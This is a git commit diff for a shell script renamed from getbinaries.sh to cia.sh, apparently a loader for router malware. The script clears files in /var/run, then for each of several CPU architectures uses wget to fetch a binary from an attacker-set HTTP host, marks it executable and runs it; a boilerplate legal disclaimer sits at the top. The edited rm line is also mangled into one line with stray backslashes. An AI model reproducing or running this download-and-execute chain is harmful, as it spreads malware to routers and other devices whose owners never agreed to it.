0f4781067ca2f8abe46021f2d209c755dba9e285
CodeMyAss <codemyass@gmail.com>
2016-04-22 09:28:34 -0500

    Update and rename getbinaries.sh to cia.sh

--- cia.sh
+++ cia.sh
@@ -1,7 +1,4 @@
 #!/bin/sh
-# THIS SCRIPT DOWNLOAD THE BINARIES INTO ROUTER.
-# UPLOAD GETBINARIES.SH IN YOUR HTTPD.
-#
 # LEGAL DISCLAIMER: It is the end user's responsibility to obey 
 # all applicable local, state and federal laws. Developers assume 
 # no liability and are not responsible for any misuse or damage 
@@ -17,11 +14,7 @@ REFERENCE_SUPERH="sh"
 REFERENCE_ARM="arm"
 REFERENCE_PPC="ppc"
 
-rm -fr /var/run/${REFERENCE_MIPSEL} \
-	/var/run/${REFERENCE_MIPS} \
-	/var/run/${REFERENCE_SUPERH} \
-	/var/run/${REFERENCE_ARM} \
-	/var/run/${REFERENCE_PPC}
+rm -fr /var/run/${REFERENCE_MIPSEL} \ /var/run/${REFERENCE_MIPS} \ /var/run/${REFERENCE_SUPERH} \ /var/run/${REFERENCE_ARM} \ /var/run/${REFERENCE_PPC}
 
 wget -c ${REFERENCE_HTTP}/${REFERENCE_MIPSEL} -P /var/run && chmod +x /var/run/${REFERENCE_MIPSEL} && /var/run/${REFERENCE_MIPSEL}
 wget -c ${REFERENCE_HTTP}/${REFERENCE_MIPS} -P /var/run && chmod +x /var/run/${REFERENCE_MIPS} && /var/run/${REFERENCE_MIPS}
